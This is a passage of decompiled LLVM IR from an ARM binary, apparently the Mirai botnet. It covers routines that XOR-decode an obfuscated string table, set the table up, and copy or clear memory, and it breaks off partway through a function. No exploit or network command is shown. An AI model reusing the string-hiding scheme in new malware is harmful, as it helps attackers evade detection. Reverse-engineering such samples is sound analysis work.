  %v0_f3b4 = phi i32 [ %v0_f3b4.pre, %dec_label_pc_f3ac.dec_label_pc_f3ac_crit_edge ], [ %v1_f3a0, %dec_label_pc_f3a8 ]
  %v2_f3b8 = phi i32 [ %v1_f3f0, %dec_label_pc_f3ac.dec_label_pc_f3ac_crit_edge ], [ 0, %dec_label_pc_f3a8 ]
  %v2_f3ac = load i32, i32* %v1_f3ac, align 4
  %v2_f3b0 = add i32 %v2_f3ac, %v2_f3b8
  %v3_f3b0 = inttoptr i32 %v2_f3b0 to i8*
  %v4_f3b0 = load i8, i8* %v3_f3b0, align 1
  %v6_f3b0 = zext i8 %v4_f3b0 to i32
  %v2_f3b4 = xor i32 %v6_f3b0, %v0_f3b4
  %v1_f3b8 = trunc i32 %v2_f3b4 to i8
  store i8 %v1_f3b8, i8* %v3_f3b0, align 1
  %v2_f3bc = load i32, i32* %v1_f3ac, align 4
  %v0_f3c0 = load i32, i32* @ip, align 4
  %v2_f3c0 = add i32 %v0_f3c0, %v2_f3bc
  %v3_f3c0 = inttoptr i32 %v2_f3c0 to i8*
  %v4_f3c0 = load i8, i8* %v3_f3c0, align 1
  %v6_f3c0 = zext i8 %v4_f3c0 to i32
  %v0_f3c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_f3c4 = xor i32 %v0_f3c4, %v6_f3c0
  %v1_f3c8 = trunc i32 %v2_f3c4 to i8
  store i8 %v1_f3c8, i8* %v3_f3c0, align 1
  %v2_f3cc = load i32, i32* %v1_f3ac, align 4
  %v0_f3d0 = load i32, i32* @ip, align 4
  %v2_f3d0 = add i32 %v0_f3d0, %v2_f3cc
  %v3_f3d0 = inttoptr i32 %v2_f3d0 to i8*
  %v4_f3d0 = load i8, i8* %v3_f3d0, align 1
  %v6_f3d0 = zext i8 %v4_f3d0 to i32
  %v0_f3d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_f3d4 = xor i32 %v0_f3d4, %v6_f3d0
  %v1_f3d8 = trunc i32 %v2_f3d4 to i8
  store i8 %v1_f3d8, i8* %v3_f3d0, align 1
  %v2_f3dc = load i32, i32* %v1_f3ac, align 4
  store i32 %v2_f3dc, i32* @r1, align 4
  %v0_f3e0 = load i32, i32* @ip, align 4
  %v2_f3e0 = add i32 %v0_f3e0, %v2_f3dc
  %v3_f3e0 = inttoptr i32 %v2_f3e0 to i8*
  %v4_f3e0 = load i8, i8* %v3_f3e0, align 1
  %v6_f3e0 = zext i8 %v4_f3e0 to i32
  %v0_f3e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_f3e4 = xor i32 %v0_f3e4, %v6_f3e0
  store i32 %v2_f3e4, i32* @r3, align 4
  %v1_f3e8 = trunc i32 %v2_f3e4 to i8
  store i8 %v1_f3e8, i8* %v3_f3e0, align 1
  %v3_f3ec = load i16, i16* %v2_f380, align 4
  %v4_f3ec = zext i16 %v3_f3ec to i32
  %v0_f3f0 = load i32, i32* @ip, align 4
  %v1_f3f0 = add i32 %v0_f3f0, 1
  store i32 %v1_f3f0, i32* @ip, align 4
  %v9_f3f4 = icmp eq i32 %v4_f3ec, %v1_f3f0
  store i1 %v9_f3f4, i1* @cpsr_z, align 1
  %v8_f3f8 = icmp sgt i32 %v4_f3ec, %v1_f3f0
  br i1 %v8_f3f8, label %dec_label_pc_f3ac.dec_label_pc_f3ac_crit_edge, label %dec_label_pc_f3fc.loopexit

dec_label_pc_f3ac.dec_label_pc_f3ac_crit_edge:    ; preds = %dec_label_pc_f3ac
  %v0_f3b4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f3ac

dec_label_pc_f3fc.loopexit:                       ; preds = %dec_label_pc_f3ac
  %v2_f3fc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_f3fc

dec_label_pc_f3fc:                                ; preds = %dec_label_pc_f3fc.loopexit, %entry
  %v2_f3fc = phi i32 [ %v2_f3fc.pre, %dec_label_pc_f3fc.loopexit ], [ %v3_f390, %entry ]
  store i32 %v2_f3fc, i32* @r4, align 4
  ret i32 %v2_f378

; uselistorder directives
  uselistorder i32 %v1_f3f0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f3a0, { 1, 0 }
  uselistorder i32 %v3_f38c, { 1, 0 }
  uselistorder i32 %v2_f37c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_f374, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f414 = mul i32 %arg1, 8
  %v2_f418 = add i32 %v3_f414, ptrtoint (i32* @global_var_23a50.509 to i32)
  %v2_f41c = load i32, i32* @global_var_20dac.512, align 4
  %v1_f420 = add i32 %v3_f414, add (i32 ptrtoint (i32* @global_var_23a50.509 to i32), i32 4)
  %v2_f420 = inttoptr i32 %v1_f420 to i16*
  %v3_f420 = load i16, i16* %v2_f420, align 4
  %v3_f424 = udiv i32 %v2_f41c, 256
  %v2_f428 = icmp eq i16 %v3_f420, 0
  %v3_f42c = udiv i32 %v2_f41c, 65536
  %v3_f430 = load i32, i32* @r4, align 4
  store i32 %v3_f430, i32* %stack_var_-16, align 4
  %v1_f434 = urem i32 %v3_f424, 256
  store i32 %v1_f434, i32* %r6.global-to-local, align 4
  %v1_f438 = urem i32 %v3_f42c, 256
  store i32 %v1_f438, i32* %r5.global-to-local, align 4
  %v3_f43c = udiv i32 %v2_f41c, 16777216
  store i32 %v3_f43c, i32* %r4.global-to-local, align 4
  %v1_f440 = urem i32 %v2_f41c, 256
  store i32 %v1_f440, i32* %lr.global-to-local, align 4
  br i1 %v2_f428, label %dec_label_pc_f49c, label %dec_label_pc_f448

dec_label_pc_f448:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_f44c = inttoptr i32 %v2_f418 to i32*
  br label %dec_label_pc_f44c

dec_label_pc_f44c:                                ; preds = %dec_label_pc_f44c.dec_label_pc_f44c_crit_edge, %dec_label_pc_f448
  %v0_f454 = phi i32 [ %v0_f454.pre, %dec_label_pc_f44c.dec_label_pc_f44c_crit_edge ], [ %v1_f440, %dec_label_pc_f448 ]
  %v2_f458 = phi i32 [ %v1_f490, %dec_label_pc_f44c.dec_label_pc_f44c_crit_edge ], [ 0, %dec_label_pc_f448 ]
  %v2_f44c = load i32, i32* %v1_f44c, align 4
  %v2_f450 = add i32 %v2_f44c, %v2_f458
  %v3_f450 = inttoptr i32 %v2_f450 to i8*
  %v4_f450 = load i8, i8* %v3_f450, align 1
  %v6_f450 = zext i8 %v4_f450 to i32
  %v2_f454 = xor i32 %v6_f450, %v0_f454
  %v1_f458 = trunc i32 %v2_f454 to i8
  store i8 %v1_f458, i8* %v3_f450, align 1
  %v2_f45c = load i32, i32* %v1_f44c, align 4
  %v0_f460 = load i32, i32* @ip, align 4
  %v2_f460 = add i32 %v0_f460, %v2_f45c
  %v3_f460 = inttoptr i32 %v2_f460 to i8*
  %v4_f460 = load i8, i8* %v3_f460, align 1
  %v6_f460 = zext i8 %v4_f460 to i32
  %v0_f464 = load i32, i32* %r6.global-to-local, align 4
  %v2_f464 = xor i32 %v0_f464, %v6_f460
  %v1_f468 = trunc i32 %v2_f464 to i8
  store i8 %v1_f468, i8* %v3_f460, align 1
  %v2_f46c = load i32, i32* %v1_f44c, align 4
  %v0_f470 = load i32, i32* @ip, align 4
  %v2_f470 = add i32 %v0_f470, %v2_f46c
  %v3_f470 = inttoptr i32 %v2_f470 to i8*
  %v4_f470 = load i8, i8* %v3_f470, align 1
  %v6_f470 = zext i8 %v4_f470 to i32
  %v0_f474 = load i32, i32* %r5.global-to-local, align 4
  %v2_f474 = xor i32 %v0_f474, %v6_f470
  %v1_f478 = trunc i32 %v2_f474 to i8
  store i8 %v1_f478, i8* %v3_f470, align 1
  %v2_f47c = load i32, i32* %v1_f44c, align 4
  %v0_f480 = load i32, i32* @ip, align 4
  %v2_f480 = add i32 %v0_f480, %v2_f47c
  %v3_f480 = inttoptr i32 %v2_f480 to i8*
  %v4_f480 = load i8, i8* %v3_f480, align 1
  %v6_f480 = zext i8 %v4_f480 to i32
  %v0_f484 = load i32, i32* %r4.global-to-local, align 4
  %v2_f484 = xor i32 %v0_f484, %v6_f480
  %v1_f488 = trunc i32 %v2_f484 to i8
  store i8 %v1_f488, i8* %v3_f480, align 1
  %v3_f48c = load i16, i16* %v2_f420, align 4
  %v4_f48c = zext i16 %v3_f48c to i32
  %v0_f490 = load i32, i32* @ip, align 4
  %v1_f490 = add i32 %v0_f490, 1
  store i32 %v1_f490, i32* @ip, align 4
  %v8_f498 = icmp sgt i32 %v4_f48c, %v1_f490
  br i1 %v8_f498, label %dec_label_pc_f44c.dec_label_pc_f44c_crit_edge, label %dec_label_pc_f49c.loopexit

dec_label_pc_f44c.dec_label_pc_f44c_crit_edge:    ; preds = %dec_label_pc_f44c
  %v0_f454.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f44c

dec_label_pc_f49c.loopexit:                       ; preds = %dec_label_pc_f44c
  %v2_f49c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_f49c

dec_label_pc_f49c:                                ; preds = %dec_label_pc_f49c.loopexit, %entry
  %v2_f49c = phi i32 [ %v2_f49c.pre, %dec_label_pc_f49c.loopexit ], [ %v3_f430, %entry ]
  store i32 %v2_f49c, i32* @r4, align 4
  ret i32 %v2_f418

; uselistorder directives
  uselistorder i32 %v1_f490, { 1, 2, 0 }
  uselistorder i32 %v1_f440, { 1, 0 }
  uselistorder i32 %v2_f41c, { 3, 0, 1, 2 }
  uselistorder i32 %v3_f414, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_f4ac = load i32, i32* @r4, align 4
  store i32 %v3_f4ac, i32* %stack_var_-24, align 4
  %v6_f4ac = load i32, i32* @r5, align 4
  %v9_f4ac = load i32, i32* @r6, align 4
  %v12_f4ac = load i32, i32* @r7, align 4
  %v15_f4ac = load i32, i32* @r8, align 4
  store i32 2, i32* @r0, align 4
  %v0_f4b4 = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_23a50.509 to i32), i32* @r4, align 4
  store i32 %v0_f4b4, i32* @r6, align 4
  %v3_f4cc = call i32 @util_memcpy(i32 %v0_f4b4, i32 ptrtoint (i32* @global_var_186dc.517 to i32), i32 2)
  %v0_f4d0 = load i32, i32* @r5, align 4
  store i32 %v0_f4d0, i32* @r0, align 4
  %v0_f4d4 = load i32, i32* @r6, align 4
  store i32 %v0_f4d4, i32* @global_var_23a58.518, align 4
  %v1_f4d8 = trunc i32 %v0_f4d0 to i16
  store i16 %v1_f4d8, i16* bitcast (i32* @global_var_23a5c.519 to i16*), align 4
  %v0_f4dc = call i32 @malloc()
  %v0_f4e0 = load i32, i32* @r5, align 4
  store i32 %v0_f4dc, i32* @r6, align 4
  %v3_f4ec = call i32 @util_memcpy(i32 %v0_f4dc, i32 ptrtoint (i32* @global_var_186e0.521 to i32), i32 %v0_f4e0)
  store i32 19, i32* @r0, align 4
  %v0_f4f4 = load i32, i32* @r6, align 4
  store i32 %v0_f4f4, i32* @global_var_23a60.522, align 4
  %v0_f4f8 = load i32, i32* @r5, align 4
  %v1_f4f8 = trunc i32 %v0_f4f8 to i16
  store i16 %v1_f4f8, i16* bitcast (i32* @global_var_23a64.523 to i16*), align 4
  %v0_f4fc = call i32 @malloc()
  store i32 %v0_f4fc, i32* @r5, align 4
  store i32 19, i32* @r8, align 4
  %v4_f510 = call i32 @util_memcpy(i32 %v0_f4fc, i32 ptrtoint ([20 x i8]* @global_var_186e4.525 to i32), i32 19)
  store i32 6, i32* @r0, align 4
  %v0_f518 = load i32, i32* @r5, align 4
  store i32 %v0_f518, i32* @global_var_23a68.526, align 4
  %v0_f51c = load i32, i32* @r8, align 4
  %v1_f51c = trunc i32 %v0_f51c to i16
  store i16 %v1_f51c, i16* bitcast (i32* @global_var_23a6c.527 to i16*), align 4
  %v0_f520 = call i32 @malloc()
  store i32 6, i32* @r7, align 4
  %v4_f534 = call i32 @util_memcpy(i32 %v0_f520, i32 ptrtoint ([7 x i8]* @global_var_186f8.529 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 %v0_f520, i32* @global_var_23a70.530, align 4
  %v0_f540 = load i32, i32* @r7, align 4
  %v1_f540 = trunc i32 %v0_f540 to i16
  store i16 %v1_f540, i16* bitcast (i32* @global_var_23a74.531 to i16*), align 4
  store i32 7, i32* @r5, align 4
  %v0_f548 = call i32 @malloc()
  %v0_f54c = load i32, i32* @r5, align 4
  store i32 %v0_f548, i32* @r6, align 4
  %v4_f558 = call i32 @util_memcpy(i32 %v0_f548, i32 ptrtoint ([8 x i8]* @global_var_18700.533 to i32), i32 %v0_f54c)
  %v0_f55c = load i32, i32* @r5, align 4
  store i32 %v0_f55c, i32* @r0, align 4
  %v0_f560 = load i32, i32* @r6, align 4
  store i32 %v0_f560, i32* @global_var_23a78.534, align 4
  %v1_f564 = trunc i32 %v0_f55c to i16
  store i16 %v1_f564, i16* bitcast (i32* @global_var_23a7c.535 to i16*), align 4
  %v0_f568 = call i32 @malloc()
  %v0_f56c = load i32, i32* @r5, align 4
  store i32 %v0_f568, i32* @r6, align 4
  %v4_f578 = call i32 @util_memcpy(i32 %v0_f568, i32 ptrtoint ([8 x i8]* @global_var_18708.537 to i32), i32 %v0_f56c)
  store i32 3, i32* @r0, align 4
  %v0_f580 = load i32, i32* @r6, align 4
  store i32 %v0_f580, i32* @global_var_23a80.538, align 4
  %v0_f584 = load i32, i32* @r5, align 4
  %v1_f584 = trunc i32 %v0_f584 to i16
  store i16 %v1_f584, i16* bitcast (i32* @global_var_23a84.539 to i16*), align 4
  %v0_f588 = call i32 @malloc()
  store i32 %v0_f588, i32* @r5, align 4
  %v4_f598 = call i32 @util_memcpy(i32 %v0_f588, i32 ptrtoint ([4 x i8]* @global_var_18710.541 to i32), i32 3)
  store i32 24, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_23a8c.542 to i16*), align 4
  %v0_f5a8 = load i32, i32* @r5, align 4
  store i32 %v0_f5a8, i32* @global_var_23a88.543, align 4
  %v0_f5ac = call i32 @malloc()
  store i32 %v0_f5ac, i32* @r5, align 4
  %v3_f5bc = call i32 @util_memcpy(i32 %v0_f5ac, i32 ptrtoint (i32* @global_var_18714.545 to i32), i32 24)
  store i32 29, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_23a94.546 to i16*), align 4
  %v0_f5cc = load i32, i32* @r5, align 4
  store i32 %v0_f5cc, i32* @global_var_23a90.547, align 4
  %v0_f5d0 = call i32 @malloc()
  store i32 %v0_f5d0, i32* @r5, align 4
  %v3_f5e0 = call i32 @util_memcpy(i32 %v0_f5d0, i32 ptrtoint (i32* @global_var_18730.549 to i32), i32 29)
  store i32 9, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_23a9c.550 to i16*), align 4
  %v0_f5f0 = load i32, i32* @r5, align 4
  store i32 %v0_f5f0, i32* @global_var_23a98.551, align 4
  %v0_f5f4 = call i32 @malloc()
  store i32 %v0_f5f4, i32* @r5, align 4
  %v4_f604 = call i32 @util_memcpy(i32 %v0_f5f4, i32 ptrtoint ([10 x i8]* @global_var_18750.553 to i32), i32 9)
  store i32 8, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_23aa4.554 to i16*), align 4
  %v0_f614 = load i32, i32* @r5, align 4
  store i32 %v0_f614, i32* @global_var_23aa0.555, align 4
  %v0_f618 = call i32 @malloc()
  store i32 %v0_f618, i32* @r5, align 4
  %v4_f628 = call i32 @util_memcpy(i32 %v0_f618, i32 ptrtoint ([9 x i8]* @global_var_1875c.557 to i32), i32 8)
  store i32 5, i32* @r0, align 4
  store i16 8, i16* bitcast (i32* @global_var_23aac.558 to i16*), align 4
  %v0_f638 = load i32, i32* @r5, align 4
  store i32 %v0_f638, i32* @global_var_23aa8.559, align 4
  %v0_f63c = call i32 @malloc()
  store i32 %v0_f63c, i32* @r5, align 4
  %v4_f64c = call i32 @util_memcpy(i32 %v0_f63c, i32 ptrtoint ([6 x i8]* @global_var_18768.561 to i32), i32 5)
  %v0_f654 = load i32, i32* @r7, align 4
  store i32 %v0_f654, i32* @r0, align 4
  store i16 5, i16* bitcast (i32* @global_var_23ab4.562 to i16*), align 4
  %v0_f65c = load i32, i32* @r5, align 4
  store i32 %v0_f65c, i32* @global_var_23ab0.563, align 4
  %v0_f660 = call i32 @malloc()
  %v0_f664 = load i32, i32* @r7, align 4
  store i32 %v0_f660, i32* @r5, align 4
  %v4_f670 = call i32 @util_memcpy(i32 %v0_f660, i32 ptrtoint ([7 x i8]* @global_var_18770.565 to i32), i32 %v0_f664)
  store i32 21, i32* @r0, align 4
  %v0_f678 = load i32, i32* @r5, align 4
  store i32 %v0_f678, i32* @global_var_23ab8.566, align 4
  %v0_f67c = load i32, i32* @r7, align 4
  %v1_f67c = trunc i32 %v0_f67c to i16
  store i16 %v1_f67c, i16* bitcast (i32* @global_var_23abc.567 to i16*), align 4
  %v0_f680 = call i32 @malloc()
  store i32 %v0_f680, i32* @r5, align 4
  store i32 21, i32* @r6, align 4
  %v3_f694 = call i32 @util_memcpy(i32 %v0_f680, i32 ptrtoint (i32* @global_var_18778.569 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  %v0_f69c = load i32, i32* @r5, align 4
  store i32 %v0_f69c, i32* @global_var_23ac0.570, align 4
  %v0_f6a0 = load i32, i32* @r6, align 4
  %v1_f6a0 = trunc i32 %v0_f6a0 to i16
  store i16 %v1_f6a0, i16* bitcast (i32* @global_var_23ac4.571 to i16*), align 4
  %v0_f6a4 = call i32 @malloc()
  store i32 %v0_f6a4, i32* @r5, align 4
  %v3_f6b4 = call i32 @util_memcpy(i32 %v0_f6a4, i32 ptrtoint (i32* @global_var_18790.573 to i32), i32 17)
  store i32 11, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_23acc.574 to i16*), align 4
  %v0_f6c4 = load i32, i32* @r5, align 4
  store i32 %v0_f6c4, i32* @global_var_23ac8.575, align 4
  %v0_f6c8 = call i32 @malloc()
  store i32 %v0_f6c8, i32* @r5, align 4
  %v0_f6d8 = load i32, i32* @r7, align 4
  %v1_f6d8 = add i32 %v0_f6d8, 5
  store i32 %v1_f6d8, i32* @r7, align 4
  %v4_f6dc = call i32 @util_memcpy(i32 %v0_f6c8, i32 ptrtoint ([12 x i8]* @global_var_187a4.577 to i32), i32 11)
  %v0_f6e0 = load i32, i32* @r6, align 4
  store i32 %v0_f6e0, i32* @r0, align 4
  %v0_f6e4 = load i32, i32* @r5, align 4
  store i32 %v0_f6e4, i32* @global_var_23ad0.578, align 4
  %v0_f6e8 = load i32, i32* @r7, align 4
  %v1_f6e8 = trunc i32 %v0_f6e8 to i16
  store i16 %v1_f6e8, i16* bitcast (i32* @global_var_23ad4.579 to i16*), align 4
  %v0_f6ec = call i32 @malloc()
  %v0_f6f4 = load i32, i32* @r6, align 4
  store i32 %v0_f6ec, i32* @r5, align 4
  %v3_f6fc = call i32 @util_memcpy(i32 %v0_f6ec, i32 ptrtoint (i32* @global_var_187b0.581 to i32), i32 %v0_f6f4)
  %v0_f700 = load i32, i32* @r8, align 4
  store i32 %v0_f700, i32* @r0, align 4
  %v0_f704 = load i32, i32* @r5, align 4
  store i32 %v0_f704, i32* @global_var_23ad8.582, align 4
  %v0_f708 = load i32, i32* @r6, align 4
  %v1_f708 = trunc i32 %v0_f708 to i16
  store i16 %v1_f708, i16* bitcast (i32* @global_var_23adc.583 to i16*), align 4
  %v0_f70c = call i32 @malloc()
  %v0_f714 = load i32, i32* @r8, align 4
  store i32 %v0_f70c, i32* @r5, align 4
  %v3_f71c = call i32 @util_memcpy(i32 %v0_f70c, i32 ptrtoint (i32* @global_var_187c8.585 to i32), i32 %v0_f714)
  store i32 23, i32* @r0, align 4
  %v0_f724 = load i32, i32* @r5, align 4
  store i32 %v0_f724, i32* @global_var_23ae0.586, align 4
  %v0_f728 = load i32, i32* @r8, align 4
  %v1_f728 = trunc i32 %v0_f728 to i16
  store i16 %v1_f728, i16* bitcast (i32* @global_var_23ae4.587 to i16*), align 4
  %v0_f72c = call i32 @malloc()
  store i32 %v0_f72c, i32* @r5, align 4
  %v3_f73c = call i32 @util_memcpy(i32 %v0_f72c, i32 ptrtoint (i32* @global_var_187dc.589 to i32), i32 23)
  %v0_f744 = load i32, i32* @r7, align 4
  store i32 %v0_f744, i32* @r0, align 4
  %v0_f748 = load i32, i32* @r5, align 4
  store i32 %v0_f748, i32* @global_var_23ae8.590, align 4
  store i16 23, i16* bitcast (i32* @global_var_23aec.591 to i16*), align 4
  %v0_f750 = call i32 @malloc()
  %v0_f758 = load i32, i32* @r7, align 4
  %v4_f760 = call i32 @util_memcpy(i32 %v0_f750, i32 ptrtoint ([12 x i8]* @global_var_187f4.593 to i32), i32 %v0_f758)
  %v0_f764 = load i32, i32* @r7, align 4
  %v1_f764 = trunc i32 %v0_f764 to i16
  store i16 %v1_f764, i16* bitcast (i32* @global_var_23af4.594 to i16*), align 4
  store i32 %v0_f750, i32* @global_var_23af0.595, align 4
  %v2_f76c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_f76c, i32* @r4, align 4
  store i32 %v6_f4ac, i32* @r5, align 4
  store i32 %v9_f4ac, i32* @r6, align 4
  store i32 %v12_f4ac, i32* @r7, align 4
  store i32 %v15_f4ac, i32* @r8, align 4
  ret i32 %v4_f760

; uselistorder directives
  uselistorder i32 %v0_f70c, { 1, 0 }
  uselistorder i32 %v0_f6ec, { 1, 0 }
  uselistorder i32 %v0_f660, { 1, 0 }
  uselistorder i32 %v0_f568, { 1, 0 }
  uselistorder i32 %v0_f548, { 1, 0 }
  uselistorder i32 %v0_f4dc, { 1, 0 }
  uselistorder i32 %v0_f4b4, { 1, 0 }
  uselistorder i32 29, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23a50.509 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_f7cc = load i8, i8* %arg1, align 1
  %v2_f7d0 = icmp eq i8 %v3_f7cc, 0
  %v0_f7d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_f7d0, i32 %v0_f7d4)
  br label %dec_label_pc_f7dc

dec_label_pc_f7dc:                                ; preds = %dec_label_pc_f7dc, %entry
  %v0_f7dc = phi i32 [ %v1_f7dc, %dec_label_pc_f7dc ], [ 0, %entry ]
  %v1_f7dc = add i32 %v0_f7dc, 1
  %v2_f7e0 = add i32 %v1_f7dc, %tmp
  %v3_f7e0 = inttoptr i32 %v2_f7e0 to i8*
  %v4_f7e0 = load i8, i8* %v3_f7e0, align 1
  %v2_f7e4 = icmp eq i8 %v4_f7e0, 0
  br i1 %v2_f7e4, label %dec_label_pc_f7ec, label %dec_label_pc_f7dc

dec_label_pc_f7ec:                                ; preds = %dec_label_pc_f7dc
  ret i32 %v1_f7dc
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_f7f0 = load i8, i8* %arg1, align 1
  %v3_f7f0 = zext i8 %v2_f7f0 to i32
  %v2_f7f4 = icmp eq i8 %v2_f7f0, 0
  br i1 %v2_f7f4, label %bb, label %dec_label_pc_f800

bb:                                               ; preds = %entry
  store i32 %v3_f7f0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f814

dec_label_pc_f800:                                ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f804

dec_label_pc_f804:                                ; preds = %dec_label_pc_f804, %dec_label_pc_f800
  %v0_f804 = phi i32 [ %v1_f804, %dec_label_pc_f804 ], [ 0, %dec_label_pc_f800 ]
  %v1_f804 = add i32 %v0_f804, 1
  store i32 %v1_f804, i32* %ip.global-to-local, align 4
  %v2_f808 = add i32 %v1_f804, %tmp
  %v3_f808 = inttoptr i32 %v2_f808 to i8*
  %v4_f808 = load i8, i8* %v3_f808, align 1
  %v6_f808 = zext i8 %v4_f808 to i32
  store i32 %v6_f808, i32* %r3.global-to-local, align 4
  %v2_f80c = icmp eq i8 %v4_f808, 0
  br i1 %v2_f80c, label %dec_label_pc_f814, label %dec_label_pc_f804

dec_label_pc_f814:                                ; preds = %dec_label_pc_f804, %bb
  %v0_f814 = phi i32 [ %v3_f7f0, %bb ], [ %v1_f804, %dec_label_pc_f804 ]
  store i32 %v0_f814, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f820

dec_label_pc_f81c:                                ; preds = %dec_label_pc_f820
  %v0_f81c = load i32, i32* %r1.global-to-local, align 4
  %v1_f81c = add i32 %v0_f81c, 1
  %v2_f81c = inttoptr i32 %v1_f81c to i8*
  %v3_f81c = load i8, i8* %v2_f81c, align 1
  store i32 %v1_f81c, i32* %r1.global-to-local, align 4
  %v0_f820.pr = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f820

dec_label_pc_f820:                                ; preds = %dec_label_pc_f814, %dec_label_pc_f81c
  %v0_f828.off0 = phi i8 [ %v2_f7f0, %dec_label_pc_f814 ], [ %v3_f81c, %dec_label_pc_f81c ]
  %v0_f820 = phi i32 [ %v0_f814, %dec_label_pc_f814 ], [ %v0_f820.pr, %dec_label_pc_f81c ]
  %v1_f820 = add i32 %v0_f820, -1
  store i32 %v1_f820, i32* %r3.global-to-local, align 4
  %v3_f824 = icmp eq i32 %v0_f820, 0
  %v2_f828 = load i32, i32* @r0, align 4
  %v3_f828 = inttoptr i32 %v2_f828 to i8*
  store i8 %v0_f828.off0, i8* %v3_f828, align 1
  %v4_f828 = load i32, i32* @r0, align 4
  %v5_f828 = add i32 %v4_f828, 1
  store i32 %v5_f828, i32* @r0, align 4
  br i1 %v3_f824, label %dec_label_pc_f830, label %dec_label_pc_f81c

dec_label_pc_f830:                                ; preds = %dec_label_pc_f820
  %v0_f830 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_f830

; uselistorder directives
  uselistorder i32 %v0_f820, { 1, 0 }
  uselistorder i32 %v0_f814, { 1, 0 }
  uselistorder i32 %v1_f804, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_f820, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_f838 = icmp eq i32 %arg3, 0
  %v0_f83c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_f838, i32 %v0_f83c)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f844

dec_label_pc_f844:                                ; preds = %dec_label_pc_f844, %entry
  %v0_f844 = phi i32 [ %v1_f84c, %dec_label_pc_f844 ], [ 0, %entry ]
  %v2_f844 = add i32 %v0_f844, %arg2
  %v3_f844 = inttoptr i32 %v2_f844 to i8*
  %v4_f844 = load i8, i8* %v3_f844, align 1
  %v4_f848 = add i32 %v0_f844, %arg1
  %v5_f848 = inttoptr i32 %v4_f848 to i8*
  store i8 %v4_f844, i8* %v5_f848, align 1
  %v0_f84c = load i32, i32* %ip.global-to-local, align 4
  %v1_f84c = add i32 %v0_f84c, 1
  store i32 %v1_f84c, i32* %ip.global-to-local, align 4
  %v9_f850 = icmp eq i32 %v1_f84c, %arg3
  br i1 %v9_f850, label %dec_label_pc_f858, label %dec_label_pc_f844

dec_label_pc_f858:                                ; preds = %dec_label_pc_f844
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_f84c, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v2_f85c = icmp eq i32 %arg2, 0
  %v0_f860 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_f85c, i32 %v0_f860)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f868

dec_label_pc_f868:                                ; preds = %dec_label_pc_f868, %entry
  %v2_f86c = phi i32 [ %v1_f870, %dec_label_pc_f868 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v4_f86c = add i32 %v2_f86c, %arg1
  %v5_f86c = inttoptr i32 %v4_f86c to i8*
  store i8 0, i8* %v5_f86c, align 1
  %v0_f870 = load i32, i32* %r2.global-to-local, align 4
  %v1_f870 = add i32 %v0_f870, 1
  store i32 %v1_f870, i32* %r2.global-to-local, align 4
  %v9_f874 = icmp eq i32 %v1_f870, %arg2
  br i1 %v9_f874, label %dec_label_pc_f87c, label %dec_label_pc_f868

dec_label_pc_f87c:                                ; preds = %dec_label_pc_f868
